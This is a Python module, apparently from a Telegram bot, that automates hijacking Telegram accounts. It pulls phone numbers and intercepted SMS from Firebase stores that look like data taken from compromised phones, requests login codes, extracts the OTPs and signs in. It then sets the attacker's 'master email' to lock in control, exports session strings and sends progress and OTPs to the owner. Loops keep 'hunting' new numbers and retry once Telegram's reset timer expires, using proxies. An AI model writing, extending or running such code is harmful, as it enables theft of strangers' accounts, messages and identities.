import asyncio
import logging
import time
import random
import traceback
from pyrogram import Client
from pyrogram.errors import SessionPasswordNeeded, FloodWait, PhoneCodeInvalid, RPCError
from pyrogram.enums import SentCodeType # 🚨 Naya import
import config
import database as db
from services.warp_manager import get_warp_proxy, start_warp
import firebase_utils as fbu

log = logging.getLogger("TGAuto")
_WARP_READY = False

async def ensure_warp():
    global _WARP_READY
    if not _WARP_READY:
        _WARP_READY = await start_warp()
    return _WARP_READY

# 🚨 Firebase se OTP dhundhne ka function
async def wait_for_firebase_otp(phone_number, timeout=60):
    start_time = time.time()
    clean_phone = ''.join(filter(str.isdigit, phone_number))[-10:]
    
    while time.time() - start_time < timeout:
        try:
            d = db.load_data()
            fbs = d.get("firebases", [])
            
            for fb in fbs[:5]:
                clients = await fbu.fetch_fb(f"{fb['url']}/clients.json", fb.get("auth"))
                if not clients or not isinstance(clients, dict): continue
                
                for dev_id, c in clients.items():
                    if not isinstance(c, dict): continue
                    if c.get("status") is not True: continue
                    
                    best_nums = fbu.extract_best_numbers(c, [])
                    if not best_nums: continue
                    
                    if best_nums[0][0] == clean_phone:
                        msgs = await fbu.fetch_fb(f"{fb['url']}/messages/{dev_id}.json?orderBy=%22%24key%22&limitToLast=5", fb.get("auth"))
                        if not msgs: continue
                        
                        for m in msgs.values():
                            if not isinstance(m, dict): continue
                            if m.get("type") != "incoming": continue
                            
                            text = m.get("message", "")
                            if "telegram" in text.lower():
                                otp = fbu.extract_otp(text)
                                if otp:
                                    log.info(f"Found SMS OTP from Firebase: {otp}")
                                    return otp
        except Exception as e:
            log.error(f"Firebase OTP error: {e}")
        
        await asyncio.sleep(5)
    return None

async def update_owner_progress(bot, text):
    try:
        await bot.send_message(config.MAIN_OWNER, f"🤖 <b>AI PROGRESS:</b>\n{text}", parse_mode="HTML")
    except:
        pass

async def auto_login_tg(bot, phone_number):
    log.info(f"Starting Auto-Login for {phone_number}")
    await update_owner_progress(bot, f"🔍 <b>Started Hunting:</b> <code>{phone_number}</code>")
    
    d = db.load_data()
    if not d.get("hunting_enabled", True):
        return {"status": "failed", "reason": "Hunting is disabled by Owner"}

    # Proxy Setup
    proxy_dict = None
    if await ensure_warp():
        proxy_dict = get_warp_proxy()
    
    if not proxy_dict:
        proxies = d.get("working_proxies", [])
        if proxies:
            p = random.choice(proxies)
            ip, port = p.split(":")[:2]
            proxy_dict = {"scheme": "socks5", "hostname": ip, "port": int(port)}

    app = Client(
        name=f"temp_{phone_number.replace('+', '')}",
        api_id=config.TG_API_ID,
        api_hash=config.TG_API_HASH,
        phone_number=phone_number,
        in_memory=True,
        proxy=proxy_dict
    )

    try:
        await app.connect()
        await update_owner_progress(bot, f"📡 Connected to Telegram. Sending code request...")
        
        try:
            sent_code = await app.send_code(phone_number)
        except FloodWait as e:
            await app.disconnect()
            return {"status": "failed", "reason": f"FloodWait: {e.value}s"}
        
        # 🚨 SMART CHECK: OTP kahan gaya?
        code_type = sent_code.type
        log.info(f"Code sent. Type: {code_type}")
        
        if code_type == SentCodeType.EMAIL:
            await update_owner_progress(bot, f"📧 <b>Email pe OTP gaya hai!</b>\nMatlab kisi aur ka email laga hua hai. Humare paas email ka access nahi hai.\n\n⏳ Ab check kar raha hu Firebase URL (SMS) se...")
            
            # Check if SMS also came (means reset timer over)
            await asyncio.sleep(10) # Give 10 secs for SMS to arrive
            sms_otp = await wait_for_firebase_otp(phone_number, timeout=20)
            
            if not sms_otp:
                # Reset timer still active, save for later
                await update_owner_progress(bot, f"⚠️ <b>SMS nahi aaya abhi.</b>\nMatlab 7-day reset timer abhi chal raha hai. Bot isko save kar raha hai aur har 6 ghante me check karega. Jaise hi SMS aayega, login ho jayega.")
                
                # Save for background retry
                d = db.load_data()
                d["telegram_accounts"][phone_number] = {"status": "waiting_for_sms_reset", "session": "", "reset_time": int(time.time()) + 21600} # Check in 6 hours
                db.save_data(d)
                
                await app.disconnect()
                return {"status": "failed", "reason": "Email pe OTP hai. SMS nahi aaya. 7-day reset timer chal raha hai. Bot save kar raha hai."}
            else:
                otp = sms_otp
        
        elif code_type == SentCodeType.SMS or code_type == SentCodeType.CALL or code_type == SentCodeType.FLASH_CALL:
            await update_owner_progress(bot, f"📱 <b>SMS/Call pe OTP gaya hai!</b>\nFirebase URL se OTP utha raha hu...")
            otp = await wait_for_firebase_otp(phone_number, timeout=60)
        
        elif code_type == SentCodeType.APP:
            await app.disconnect()
            return {"status": "failed", "reason": "Account pehle se logged in hai (Telegram App). Hum login nahi kar sakte."}
        
        else:
            await app.disconnect()
            return {"status": "failed", "reason": f"Unknown code type: {code_type}"}

        # OTP available?
        if not otp:
            await app.disconnect()
            return {"status": "failed", "reason": "OTP nahi mila (Firebase/SMS timeout)."}

        await update_owner_progress(bot, f"🔑 <b>OTP Mila:</b> <code>{otp}</code>\n🔐 Login kar raha hu...")
        
        try:
            await app.sign_in(phone_number, sent_code.phone_code_hash, otp)
        except SessionPasswordNeeded:
            await app.disconnect()
            return {"status": "failed", "reason": "2FA Password Enabled."}
        except PhoneCodeInvalid:
            await app.disconnect()
            return {"status": "failed", "reason": "Invalid OTP"}

        # Login successful! Master Email set karo
        await update_owner_progress(bot, f"✅ <b>Login Successful!</b>\nMaster Email laga raha hu...")
        
        try:
            await app.update_profile(email=config.MASTER_EMAIL)
            await update_owner_progress(bot, f"🔒 <b>Master Email Set!</b> ({config.MASTER_EMAIL})")
        except Exception as e:
            log.warning(f"Email set failed: {e}")

        session_string = await app.export_session_string()
        await app.disconnect()

        return {"status": "success", "session": session_string, "phone": phone_number}

    except Exception as e:
        log.error(traceback.format_exc())
        if app.is_connected: 
            await app.disconnect()
        return {"status": "failed", "reason": str(e)}


async def reset_watchdog_loop(bot):
    """Ye loop har 6 ghante me check karega jo accounts SMS wait pe hain"""
    while True:
        d = db.load_data()
        if not d.get("hunting_enabled", True):
            await asyncio.sleep(3600)
            continue
            
        tg_accounts = d.get("telegram_accounts", {})
        now = int(time.time())
        updated = False
        
        for phone, acc in tg_accounts.items():
            status = acc.get("status")
            reset_time = acc.get("reset_time", 0)
            
            if status in ["waiting_7_days", "waiting_for_sms_reset"] and now >= reset_time:
                await update_owner_progress(bot, f"🕒 <b>Timer Complete!</b>\n{phone} ka reset timer khatam hua. Re-login try kar raha hu...")
                res = await auto_login_tg(bot, phone)
                if res["status"] == "success":
                    acc["session"] = res["session"]
                    acc["status"] = "active"
                elif "SMS nahi aaya" not in res.get("reason", ""):
                    acc["status"] = "failed"
                    acc["reason"] = res["reason"]
                updated = True
        
        if updated: db.save_data(d)
        await asyncio.sleep(21600) # 6 hours


async def auto_hunter_loop(bot):
    log.info("Auto-Hunter Background Loop Started...")
    while True:
        try:
            d = db.load_data()
            if not d.get("hunting_enabled", True):
                await asyncio.sleep(60)
                continue

            fbs = d.get("firebases", [])
            if not fbs:
                await asyncio.sleep(60)
                continue

            found_number = None
            for fb in fbs[:5]:
                clients = await fbu.fetch_fb(f"{fb['url']}/clients.json", fb.get("auth"))
                if not clients or not isinstance(clients, dict): continue

                for dev_id, c in clients.items():
                    if not isinstance(c, dict): continue
                    if c.get("status") is True:
                        best_nums = fbu.extract_best_numbers(c, [])
                        if best_nums:
                            found_number = best_nums[0][0]
                            break
                if found_number: break

            if found_number:
                tg_accounts = d.get("telegram_accounts", {})
                if f"+91{found_number}" in tg_accounts:
                    await asyncio.sleep(30)
                    continue

                res = await auto_login_tg(bot, f"+91{found_number}")
                
                d = db.load_data()
                if res["status"] == "success":
                    d["telegram_accounts"][f"+91{found_number}"] = {"status": "active", "session": res["session"], "reset_time": 0}
                elif "waiting" in res.get("reason", "").lower() or "SMS nahi aaya" in res.get("reason", ""):
                    # Already saved in auto_login_tg
                    pass
                else:
                    d["telegram_accounts"][f"+91{found_number}"] = {"status": "failed", "reason": res.get("reason", "Unknown")}
                
                db.save_data(d)

            await asyncio.sleep(120)
        except Exception as e:
            log.error(f"Auto-Hunter Error: {e}")
            await asyncio.sleep(60)
